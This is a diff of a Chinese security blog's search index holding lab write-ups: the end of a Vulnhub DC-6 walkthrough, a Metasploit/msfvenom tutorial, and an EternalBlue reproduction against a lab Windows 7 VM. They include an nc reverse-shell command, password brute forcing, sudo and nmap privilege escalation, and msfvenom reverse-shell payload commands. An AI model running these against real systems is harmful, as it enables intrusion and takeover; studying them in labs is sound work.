+<p>因此修改一下<strong>hosts</strong>文件，加入内容：<code>192.168.11.140 wordy</code></p>
+<p>保存即可，再次访问即可访问成功</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/4.png" alt></p>
+<p>既然已经知道CMS是WordPress了，那就直接用wpscan开始扫描</p>
+<p>列举用户名</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/5.png" alt></p>
+<p>成功找到五个用户</p>
+<p>将五个用户名存入txt</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njens \ngraham \nmark \nsarah&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/6.png" alt></p>
+<p>在DC-6的官网中有个提示</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/7.png" alt></p>
+<p>因此这个很有可能就是我们需要的密码</p>
+<p>进入目录，发现还未解压，那么就解压一下</p>
+<p>参考解压方式：</p>
+<ol>
+<li><code>*.tar</code> 用<code>tar –xvf</code>解压</li>
+<li><code>*.gz</code> 用 <code>gzip -d</code>或者<code>gunzip</code>解压</li>
+<li><code>*.tar.gz</code>和<code>*.tgz</code> 用<code>tar –xzf</code>解压</li>
+<li><code>*.bz2</code>用<code>bzip2 -d</code>或者用<code>bunzip2</code>解压</li>
+<li><code>*.tar.bz2</code>用<code>tar –xjf</code>解压</li>
+<li><code>*.Z</code>用<code>uncompress</code>解压</li>
+<li><code>*.tar.Z</code>用<code>tar –xZf</code>解压</li>
+<li><code>*.rar</code>用<code>unrar e</code>解压</li>
+<li><code>*.zip</code>用<code>unzip</code>解压</li>
+<li><code>*.xz</code>用<code>xz -d</code>解压</li>
+<li><code>*.tar.xz</code>用<code>tar -zJf</code>解压</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip -d rockyou.txt.gz &gt; rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/8.png" alt></p>
+<p>然后根据提示将这个密码中关于”k01”部分的密码复制出来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/9.png" alt></p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过信息收集我们得到了用户名和密码，那么就能通过<code>wpscan</code>尝试暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/10.png" alt></p>
+<p>得到账号密码：</p>
+<blockquote>
+<p>mark / helpdesk01</p>
+</blockquote>
+<p>然后用<code>dirsearch</code>找一下后台登录入口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.11.140</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/11.png" alt></p>
+<p>登录mark的账号</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/12.png" alt></p>
+<p>寻找一下有没有利用点</p>
+<p>然后在<code>Activity monitor → Tools</code>的<code>&quot;Lookup&quot;</code>里发现有命令执行漏洞</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/13.png" alt></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>那接下来就反弹一下shell吧，因为在网页里命令的长度受到了限制，因此我们可以用burp抓个包，然后写入命令</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/14.png" alt></p>
+<p>开启监听：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p>反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
+<p>最后再用python换成交互shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/15.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试能不能<code>suid</code>提权，但并没有好的利用点</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/16.png" alt></p>
+<p>尝试免密使用的root命令，但需要密码，并不行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/17.png" alt></p>
+<p>那么就找找信息吧，进入到<code>home</code>目录，发现在<code>mark → stuff</code>里有另一个用户<code>graham</code>的密码</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/18.png" alt></p>
+<blockquote>
+<p>graham / GSo7isUM1D4</p>
+</blockquote>
+<p>切换用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su graham</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/12/Vulnhub-DC-6/19.png" alt></p>
+<p>再次尝试suid提权，但和上一个用户一样没什么可用的</p>
+<p>查看免密使用的root权限命令，发现存在一个可以通过<code>jens</code>的身份去使用的备份文件</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/20.png" alt></p>
+<p>那么接下来的思路就是在这个备份文件中写入<code>/bin/bash</code>然后以<code>jens</code>运行这个<code>sh</code>文件即可得到目标shell</p>
+<p>写入/bin/bash</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>
+<p>以jens身份运行得到shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure>
+<p>成功得到jens用户的shell</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/21.png" alt></p>
+<p>叒尝试suid提权，一样没有利用点</p>
+<p>查看免密使用的root权限命令，似乎有机会</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/22.png" alt></p>
+<p>查看一下<code>nmap</code>提权，分两种情况</p>
+<ol>
+<li><p>SUID，那就直接提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>只有单个用户被分配有root权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; shell.nse</span><br><span class="line">sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>os.execute</code>和C语言中的<code>system()</code>命令是一样的</p>
+<p><code>--script</code>是指出nmap所要执行的脚本文件</p>
+</blockquote>
+</li>
+</ol>
+<p>在我们这里很明显是第二种情况</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/23.png" alt></p>
+<p>提权成功，拿到flag</p>
+<p><img src="/2022/08/12/Vulnhub-DC-6/24.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123644264?spm=1001.2014.3001.5502">dc-6 靶机渗透学习</a></p>
+<p><a href="https://www.freebuf.com/articles/system/261271.html">Linux通过第三方应用提权实战总结</a></p>
+<p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224">nmap提权几种方式</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1714,6 +1714,170 @@
       </tags>
   </entry>
   <entry>
+    <title>metasploit</title>
+    <url>/2022/04/24/metasploit/</url>
+    <content><![CDATA[<h1 id="一、metasploit框架介绍"><a href="#一、metasploit框架介绍" class="headerlink" title="一、metasploit框架介绍"></a>一、metasploit框架介绍</h1><blockquote>
+<p>metasploit是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并且还在持续保持更新</p>
+</blockquote>
+<p>该工具在kali上的路径是：<code>/usr/share/metasploit-framework/</code>，目录：</p>
+<ol>
+<li><code>data</code>：包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件</li>
+<li><code>documentation</code>：包含框架的可用文档</li>
+<li><code>lib</code>：metasploit的库文件夹</li>
+<li><code>plugins</code>：用来存放metasploit的脚本，包括meterpreter及其他脚本</li>
+<li><code>tools</code>：存放多种的命令行实用程序</li>
+<li><strong><code>modules</code>：存储metasploit的模块文件</strong></li>
+</ol>
+<p>其中的modules目录：</p>
+<ol>
+<li><code>auxiliary</code>：辅助模块，辅助渗透（端口扫描、登陆密码爆破、漏洞验证等）</li>
+<li><code>exploits</code>：漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则：操作系统/各种应用协议分类</li>
+<li><code>payloads</code>：有效攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹shell的代码</li>
+<li><code>post</code>：后渗透阶段模块，漏洞利用成功后获得meterpreter之后，向目标发送的一些功能性指令，如：提权等</li>
+<li><code>encoders</code>：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</li>
+<li><code>evasion</code>：躲避模块，用来生成免杀payload</li>
+<li><code>nops</code>：由于IDS/IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串（NOPS x90x90…）则会因为被拦截而导致攻击失效</li>
+</ol>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1、进入metasploit框架"><a href="#1、进入metasploit框架" class="headerlink" title="1、进入metasploit框架"></a>1、进入metasploit框架</h2><ol>
+<li><code>msfconsole</code>：进入框架</li>
+<li><code>msfdb init</code>：初始化、连接数据库</li>
+<li><code>db_status</code>：查看是否成功连接到数据库</li>
+<li><code>workspace</code>：当前工作区</li>
+<li><code>workspace -h</code>：帮助命令</li>
+</ol>
+<h2 id="2、内网主机发现"><a href="#2、内网主机发现" class="headerlink" title="2、内网主机发现"></a>2、内网主机发现</h2><ol>
+<li><code>db_nmap</code>：nmap扫描，”db”指将扫描结果存入数据库</li>
+<li><code>-PA</code>：TCP ACK PING扫描</li>
+<li><code>-PS</code>：TCP SYN PING扫描</li>
+<li><code>-PR</code>：ARP扫描是nmap对目标进行一个arp ping扫描的过程，尤其在内网的情况下。因为防火墙不会禁止ARP请求</li>
+<li><code>hosts</code>：列出当前工作区扫描出来的所有主机</li>
+</ol>
+<p><img src="/2022/04/24/metasploit/1.png" alt></p>
+<h2 id="3、端口、服务、版本探测"><a href="#3、端口、服务、版本探测" class="headerlink" title="3、端口、服务、版本探测"></a>3、端口、服务、版本探测</h2><ol>
+<li><code>db_nmap</code>：nmap扫描</li>
+<li><code>-T[0-5]</code>：默认为T3，T4表示最大TCP扫描延迟为10ms</li>
+<li><code>-sS</code>：TCP SYN扫描</li>
+<li><code>-sY</code>：TCP SYN扫描</li>
+<li><code>-A</code>：打开操作系统探测和版本探测</li>
+</ol>
+<p><img src="/2022/04/24/metasploit/2.png" alt></p>
+<h2 id="4、检查是否具有常见漏洞"><a href="#4、检查是否具有常见漏洞" class="headerlink" title="4、检查是否具有常见漏洞"></a>4、检查是否具有常见漏洞</h2><ol>
+<li><code>db_nmap</code>：nmap扫描</li>
+<li><code>--script=vuln</code>：检查是否有常见漏洞</li>
+</ol>
+<h1 id="三、msfvenom实战"><a href="#三、msfvenom实战" class="headerlink" title="三、msfvenom实战"></a>三、msfvenom实战</h1><h2 id="1、msfvenom介绍"><a href="#1、msfvenom介绍" class="headerlink" title="1、msfvenom介绍"></a>1、msfvenom介绍</h2><p><code>msfvenom</code>是<code>msfpayload</code>和<code>msfencode</code>的组合，将这两个工具集成在一个框架实例中。</p>
+<p><code>msfvenom</code>是一个用来生成后门的软件，在目标机上执行后门，在本地监听上线。</p>
+<p>监听模块：<code>use exploit/multi/handler</code></p>
+<p>快速建立监听：<code>handler -H &lt;Your IP Address&gt; -P &lt;Your Port to connect&gt; -p &lt;parload&gt;</code></p>
+<h2 id="2、msfvenom基本参数"><a href="#2、msfvenom基本参数" class="headerlink" title="2、msfvenom基本参数"></a>2、msfvenom基本参数</h2><ol>
+<li><code>-P(--payload)</code>：指定特定的Payload ,如果被设置为- , 那么从标准输入流中读取</li>
+<li><code>-l(--list)</code>：列出所有可用的项目,其中值可以被设置为payloads, encoders, nops, all</li>
+<li><code>-n(--nopsled)</code>：指定nop在payload中的数量</li>
+<li><code>-f(--format)</code>：指定Payload的输出格式( —list formats :列出所有可用的输出格式)</li>
+<li><code>-e(--encoder)</code>：指定使用的encoder</li>
+<li><code>-a(--arch)</code>：指定目标系统架构</li>
+<li><code>--platform</code>：指定目标系统平台</li>
+<li><code>-s(--space)</code>：设置未经编码的Payload的最大长度( —encoder-space :编码后的Payload的最大长度)</li>
+<li><code>-b(--bad-chars)</code>：设置需要在Payload中避免出现的字符,例如: ‘\0f’、 \x00’等</li>
+<li><code>-i(--iterations)</code>：设置Payload的编码次数</li>
+<li><code>--smallest</code>：尽可能生成最短的Payload</li>
+<li><code>-o(--out)</code>：保存Payload到文件</li>
+<li><code>-c(--add-code)</code>：指定-个附加的win32 shellcode文件</li>
+<li><code>-x(--template)</code>：指定一个特定的可执行文件作为模板</li>
+<li><code>-k(--keep)</code>：保护模板程序的功能,注入的payload作为一个新的进程运行</li>
+</ol>
+<h2 id="3、实战"><a href="#3、实战" class="headerlink" title="3、实战"></a>3、实战</h2><h3 id="payload理解"><a href="#payload理解" class="headerlink" title="payload理解"></a>payload理解</h3><ol>
+<li><code>single</code>：是一种完全独立的Payload ,将完整的payload都编译在木马中，体积庞大不灵活,而且容易被杀。如: meterpreter reverse. _tcp</li>
+<li><code>stager</code>：负责建立目标用户与攻击者之间的网络连接,将执行传递到另一个阶段。如: reverse_tcp、bind_tcp<ul>
+<li>作用①：允许我们使用较小的有效载荷去加载具有更多功能的较大的payload</li>
+<li>作用②：使通信机制与最终阶段分离成为可能</li>
+</ul>
+</li>
+<li><code>stage</code>：提供更高级的功能，且没有大小限制（因为stager为stage分配了大量内存）如：meterpreter</li>
+</ol>
+<blockquote>
+<p><strong>stager</strong>和<strong>stage</strong>就像web入侵里面提到的小马和大马一样，由于攻击利用环境的限制，可能不能一下子把<strong>stage</strong>传过去 ，需要先传一个<strong>stager</strong>，<strong>stager</strong>在<strong>attacker</strong>和<strong>target</strong>之间建立网络连接，之后再把<strong>stage</strong>传过去进行下一步的行动。 需要说明的是<strong>meterpreter</strong>在漏洞利用成功后会发送第二阶段的代码和<strong>meterpreter</strong>服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令，经常出现什么sending stager error，如果网络真的很差的话,可以选用<strong>stageless meterpreter</strong></p>
+</blockquote>
+<h3 id="1-msfvenom生成可执行程序payload"><a href="#1-msfvenom生成可执行程序payload" class="headerlink" title="(1)msfvenom生成可执行程序payload"></a>(1)msfvenom生成可执行程序payload</h3><ul>
+<li><p>Linux：</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; IPORT= &lt;Your Port to Connect On&gt; -f elf -o /root/Desktop/shell.elf</code></p>
+<p><code>msfvenom -p linux/x86/meterpreter/bind_ _tcp LHOST=&lt;Target IP Address&gt; LPORT= &lt;Your Port to ConnectOn&gt; -f elf -o /root/Desktop/shell.elf</code></p>
+</li>
+<li><p>Windows：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f exe -o /root/Desktop/shell.exe</code></p>
+</li>
+<li><p>Mac：</p>
+<p><code>msfvenom -p osx/x86/shell_ reverse_ _tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f macho -o /root/Desktop/shell.macho</code></p>
+</li>
+</ul>
+<h3 id="2-msfvenom生成web-payload"><a href="#2-msfvenom生成web-payload" class="headerlink" title="(2)msfvenom生成web payload"></a>(2)msfvenom生成web payload</h3><ul>
+<li>php：<code>msfvenom -p php/meterpreter/reverse_ _tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f raw -o /root/Desktop/shell.php</code></li>
+<li>asp：<code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f aspx -o /root/Desktop/shell.aspx</code></li>
+<li>jsp：<code>msfvenom -p java/jsp_ shell_ _reverse_ _tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f raw -o /root/Desktop/shell.jsp</code></li>
+<li>war：<code>msfvenom -p java/jsp_ shell. _reverse_ .tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f war -o /root/Desktop/shell.war</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>永恒之蓝复现</title>
+    <url>/2022/04/12/ms17-010/</url>
+    <content><![CDATA[<h1 id="一、搭建测试环境"><a href="#一、搭建测试环境" class="headerlink" title="一、搭建测试环境"></a>一、搭建测试环境</h1><p>两台虚拟机</p>
+<ul>
+<li>kali linux（攻击机）ip：192.168.11.132</li>
+<li>Windows 7（被攻击机）ip：192.168.11.128</li>
+</ul>
+<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
+<h1 id="二、扫描端口"><a href="#二、扫描端口" class="headerlink" title="二、扫描端口"></a>二、扫描端口</h1><p>使用nmap扫描端口查看是否开放445端口</p>
+<p><code>nmap 192.168.11.128</code></p>
+<p><img src="/2022/04/12/ms17-010/1.png" alt></p>
+<p>发现445端口开放</p>
+<h1 id="三、使用Metasploit工具"><a href="#三、使用Metasploit工具" class="headerlink" title="三、使用Metasploit工具"></a>三、使用Metasploit工具</h1><p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
+<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
+<p><img src="/2022/04/12/ms17-010/2.png" alt></p>
+<h2 id="1、检验是否有漏洞"><a href="#1、检验是否有漏洞" class="headerlink" title="1、检验是否有漏洞"></a>1、检验是否有漏洞</h2><p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p><code>show options</code>可以查看需要配置的东西</p>
+<p><img src="/2022/04/12/ms17-010/3.png" alt></p>
+<ol>
+<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
+<li>配置端口：<code>set RPORT 445</code></li>
+</ol>
+<p><img src="/2022/04/12/ms17-010/4.png" alt></p>
+<p>配置好之后<code>run</code>即可</p>
+<p><img src="/2022/04/12/ms17-010/5.png" alt></p>
+<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
+<h2 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h2><p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><code>show options</code>查看需要配置的内容</p>
+<p>同理，配置好ip和端口即可</p>
+<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
+<p><img src="/2022/04/12/ms17-010/6.png" alt></p>
+<h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h2><ol>
+<li>使用<code>screenshot</code>可以截屏</li>
+<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
+<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
+<li><code>exit</code>退出</li>
+<li>…</li>
+</ol>
+<p>但在使用Windows shell的时候会发现有乱码</p>
+<p><img src="/2022/04/12/ms17-010/7.png" alt></p>
+<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
+<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pikachu</title>
     <url>/2022/04/17/pikachu/</url>
     <content><![CDATA[<h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><ol>
@@ -2186,118 +2350,6 @@
       </tags>
   </entry>
   <entry>
-    <title>metasploit</title>
-    <url>/2022/04/24/metasploit/</url>
-    <content><![CDATA[<h1 id="一、metasploit框架介绍"><a href="#一、metasploit框架介绍" class="headerlink" title="一、metasploit框架介绍"></a>一、metasploit框架介绍</h1><blockquote>
-<p>metasploit是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并且还在持续保持更新</p>
-</blockquote>
-<p>该工具在kali上的路径是：<code>/usr/share/metasploit-framework/</code>，目录：</p>
-<ol>
-<li><code>data</code>：包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件</li>
-<li><code>documentation</code>：包含框架的可用文档</li>
-<li><code>lib</code>：metasploit的库文件夹</li>
-<li><code>plugins</code>：用来存放metasploit的脚本，包括meterpreter及其他脚本</li>
-<li><code>tools</code>：存放多种的命令行实用程序</li>
-<li><strong><code>modules</code>：存储metasploit的模块文件</strong></li>
-</ol>
-<p>其中的modules目录：</p>
-<ol>
-<li><code>auxiliary</code>：辅助模块，辅助渗透（端口扫描、登陆密码爆破、漏洞验证等）</li>
-<li><code>exploits</code>：漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则：操作系统/各种应用协议分类</li>
-<li><code>payloads</code>：有效攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹shell的代码</li>
-<li><code>post</code>：后渗透阶段模块，漏洞利用成功后获得meterpreter之后，向目标发送的一些功能性指令，如：提权等</li>
-<li><code>encoders</code>：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</li>
-<li><code>evasion</code>：躲避模块，用来生成免杀payload</li>
-<li><code>nops</code>：由于IDS/IPS会检查数据包中不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串（NOPS x90x90…）则会因为被拦截而导致攻击失效</li>
-</ol>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1、进入metasploit框架"><a href="#1、进入metasploit框架" class="headerlink" title="1、进入metasploit框架"></a>1、进入metasploit框架</h2><ol>
-<li><code>msfconsole</code>：进入框架</li>
-<li><code>msfdb init</code>：初始化、连接数据库</li>
-<li><code>db_status</code>：查看是否成功连接到数据库</li>
-<li><code>workspace</code>：当前工作区</li>
-<li><code>workspace -h</code>：帮助命令</li>
-</ol>
-<h2 id="2、内网主机发现"><a href="#2、内网主机发现" class="headerlink" title="2、内网主机发现"></a>2、内网主机发现</h2><ol>
-<li><code>db_nmap</code>：nmap扫描，”db”指将扫描结果存入数据库</li>
-<li><code>-PA</code>：TCP ACK PING扫描</li>
-<li><code>-PS</code>：TCP SYN PING扫描</li>
-<li><code>-PR</code>：ARP扫描是nmap对目标进行一个arp ping扫描的过程，尤其在内网的情况下。因为防火墙不会禁止ARP请求</li>
-<li><code>hosts</code>：列出当前工作区扫描出来的所有主机</li>
-</ol>
-<p><img src="/2022/04/24/metasploit/1.png" alt></p>
-<h2 id="3、端口、服务、版本探测"><a href="#3、端口、服务、版本探测" class="headerlink" title="3、端口、服务、版本探测"></a>3、端口、服务、版本探测</h2><ol>
-<li><code>db_nmap</code>：nmap扫描</li>
-<li><code>-T[0-5]</code>：默认为T3，T4表示最大TCP扫描延迟为10ms</li>
-<li><code>-sS</code>：TCP SYN扫描</li>
-<li><code>-sY</code>：TCP SYN扫描</li>
-<li><code>-A</code>：打开操作系统探测和版本探测</li>
-</ol>
-<p><img src="/2022/04/24/metasploit/2.png" alt></p>
-<h2 id="4、检查是否具有常见漏洞"><a href="#4、检查是否具有常见漏洞" class="headerlink" title="4、检查是否具有常见漏洞"></a>4、检查是否具有常见漏洞</h2><ol>
-<li><code>db_nmap</code>：nmap扫描</li>
-<li><code>--script=vuln</code>：检查是否有常见漏洞</li>
-</ol>
-<h1 id="三、msfvenom实战"><a href="#三、msfvenom实战" class="headerlink" title="三、msfvenom实战"></a>三、msfvenom实战</h1><h2 id="1、msfvenom介绍"><a href="#1、msfvenom介绍" class="headerlink" title="1、msfvenom介绍"></a>1、msfvenom介绍</h2><p><code>msfvenom</code>是<code>msfpayload</code>和<code>msfencode</code>的组合，将这两个工具集成在一个框架实例中。</p>
-<p><code>msfvenom</code>是一个用来生成后门的软件，在目标机上执行后门，在本地监听上线。</p>
-<p>监听模块：<code>use exploit/multi/handler</code></p>
-<p>快速建立监听：<code>handler -H &lt;Your IP Address&gt; -P &lt;Your Port to connect&gt; -p &lt;parload&gt;</code></p>
-<h2 id="2、msfvenom基本参数"><a href="#2、msfvenom基本参数" class="headerlink" title="2、msfvenom基本参数"></a>2、msfvenom基本参数</h2><ol>
-<li><code>-P(--payload)</code>：指定特定的Payload ,如果被设置为- , 那么从标准输入流中读取</li>
-<li><code>-l(--list)</code>：列出所有可用的项目,其中值可以被设置为payloads, encoders, nops, all</li>
-<li><code>-n(--nopsled)</code>：指定nop在payload中的数量</li>
-<li><code>-f(--format)</code>：指定Payload的输出格式( —list formats :列出所有可用的输出格式)</li>
-<li><code>-e(--encoder)</code>：指定使用的encoder</li>
-<li><code>-a(--arch)</code>：指定目标系统架构</li>
-<li><code>--platform</code>：指定目标系统平台</li>
-<li><code>-s(--space)</code>：设置未经编码的Payload的最大长度( —encoder-space :编码后的Payload的最大长度)</li>
-<li><code>-b(--bad-chars)</code>：设置需要在Payload中避免出现的字符,例如: ‘\0f’、 \x00’等</li>
-<li><code>-i(--iterations)</code>：设置Payload的编码次数</li>
-<li><code>--smallest</code>：尽可能生成最短的Payload</li>
-<li><code>-o(--out)</code>：保存Payload到文件</li>
-<li><code>-c(--add-code)</code>：指定-个附加的win32 shellcode文件</li>
-<li><code>-x(--template)</code>：指定一个特定的可执行文件作为模板</li>
-<li><code>-k(--keep)</code>：保护模板程序的功能,注入的payload作为一个新的进程运行</li>
-</ol>
-<h2 id="3、实战"><a href="#3、实战" class="headerlink" title="3、实战"></a>3、实战</h2><h3 id="payload理解"><a href="#payload理解" class="headerlink" title="payload理解"></a>payload理解</h3><ol>
-<li><code>single</code>：是一种完全独立的Payload ,将完整的payload都编译在木马中，体积庞大不灵活,而且容易被杀。如: meterpreter reverse. _tcp</li>
-<li><code>stager</code>：负责建立目标用户与攻击者之间的网络连接,将执行传递到另一个阶段。如: reverse_tcp、bind_tcp<ul>
-<li>作用①：允许我们使用较小的有效载荷去加载具有更多功能的较大的payload</li>
-<li>作用②：使通信机制与最终阶段分离成为可能</li>
-</ul>
-</li>
-<li><code>stage</code>：提供更高级的功能，且没有大小限制（因为stager为stage分配了大量内存）如：meterpreter</li>
-</ol>
-<blockquote>
-<p><strong>stager</strong>和<strong>stage</strong>就像web入侵里面提到的小马和大马一样，由于攻击利用环境的限制，可能不能一下子把<strong>stage</strong>传过去 ，需要先传一个<strong>stager</strong>，<strong>stager</strong>在<strong>attacker</strong>和<strong>target</strong>之间建立网络连接，之后再把<strong>stage</strong>传过去进行下一步的行动。 需要说明的是<strong>meterpreter</strong>在漏洞利用成功后会发送第二阶段的代码和<strong>meterpreter</strong>服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令，经常出现什么sending stager error，如果网络真的很差的话,可以选用<strong>stageless meterpreter</strong></p>
-</blockquote>
-<h3 id="1-msfvenom生成可执行程序payload"><a href="#1-msfvenom生成可执行程序payload" class="headerlink" title="(1)msfvenom生成可执行程序payload"></a>(1)msfvenom生成可执行程序payload</h3><ul>
-<li><p>Linux：</p>
-<p><code>msfvenom -p linux/x86/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; IPORT= &lt;Your Port to Connect On&gt; -f elf -o /root/Desktop/shell.elf</code></p>
-<p><code>msfvenom -p linux/x86/meterpreter/bind_ _tcp LHOST=&lt;Target IP Address&gt; LPORT= &lt;Your Port to ConnectOn&gt; -f elf -o /root/Desktop/shell.elf</code></p>
-</li>
-<li><p>Windows：</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f exe -o /root/Desktop/shell.exe</code></p>
-</li>
-<li><p>Mac：</p>
